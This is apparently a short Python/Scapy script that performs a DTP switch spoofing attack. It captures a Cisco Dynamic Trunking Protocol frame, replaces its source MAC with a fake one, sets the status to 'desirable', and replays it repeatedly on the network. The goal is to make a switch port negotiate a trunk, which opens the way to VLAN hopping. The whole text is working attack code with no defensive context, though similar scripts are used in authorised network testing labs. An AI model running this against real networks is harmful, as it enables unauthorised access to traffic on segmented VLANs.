from scapy.all import *

load_contrib("dtp")

#Capture DTP frame
pkt = sniff(filter="ether dst 01:00:0c:cc:cc:cc", count=1)

#Change the MAC address
pkt[0].src="00:00:00:11:11:11"

#Change the desirabl
pkt[0][DTP][DTPStatus].status='\x03'

#Send into network 
for i in range(1, 50):
    sendp(pkt[0], loop=0, verbose=1)
    time.sleep(5)